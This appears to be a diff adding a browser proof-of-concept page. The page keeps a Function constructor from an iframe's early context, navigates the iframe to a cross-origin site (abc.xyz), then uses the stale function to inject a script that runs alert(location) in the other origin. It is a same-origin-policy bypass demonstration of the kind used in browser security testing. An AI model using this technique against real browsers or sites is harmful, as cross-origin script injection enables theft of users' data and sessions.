@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title></title>
+  </head>
+  <body>
+    <script>
+    let f = document.body.appendChild(document.createElement("iframe"));
+    let get_element = f.contentWindow.Function("return logo;");
+
+    f.onload = () => {
+        f.onload = null;
+        let node = get_element();
+        var sc = document.createElement("script");
+        sc.innerText = "alert(location)";
+        node.appendChild(sc);
+    };
+
+    f.src = "https://abc.xyz/";
+    </script>
+
+  </body>
+</html>
